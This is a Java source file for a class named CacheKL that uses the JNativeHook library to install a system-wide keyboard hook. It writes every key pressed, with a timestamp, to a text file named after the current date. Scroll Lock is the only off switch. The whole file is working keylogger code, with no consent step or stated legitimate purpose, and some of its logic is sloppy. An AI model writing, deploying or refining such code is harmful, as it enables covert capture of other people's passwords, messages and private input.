package principal;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class CacheKL implements NativeKeyListener {

    Date data = new Date();
    SimpleDateFormat fd = new SimpleDateFormat("dd-MM-yyyy");
    String fdd = fd.format(data);
    Date hora = new Date();
    SimpleDateFormat fh = new SimpleDateFormat("[--HH:mm:ss--]");
    String fhh = fh.format(hora);
    File file = new File(fdd + ".txt");
 
    private String dados;
    private boolean horaInserida = false;
    private BufferedWriter writer;
 
    public static void main(String[] args) throws Exception {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, e.getMessage());
        }
        GlobalScreen.addNativeKeyListener(new CacheKL());
    }
    
    public CacheKL() throws Exception {
        dados = "";
        writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true));
    }

    public void nativeKeyPressed(NativeKeyEvent nke) {
        String dados = NativeKeyEvent.getKeyText(nke.getKeyCode());
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd + ".txt"), true))) {
             if (!horaInserida) {
                horaInserida = true;
                dados += fhh + "\n";
            }
            if (nke.getKeyCode() == NativeKeyEvent.VC_BACKSPACE) {
                dados = dados.substring (0, dados.length() - 1);
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_ENTER) {
                writer.write("\n");
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SPACE) {
                writer.write(" ");
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SCROLL_LOCK) {
                try {
                    GlobalScreen.unregisterNativeHook();
                } catch (NativeHookException ex) {
                    JOptionPane.showMessageDialog(null, ex.getMessage());
                }
            } else if (true) {
                writer.write(dados);
                writer.flush();
            }
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, ex.getMessage());
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
    }
}
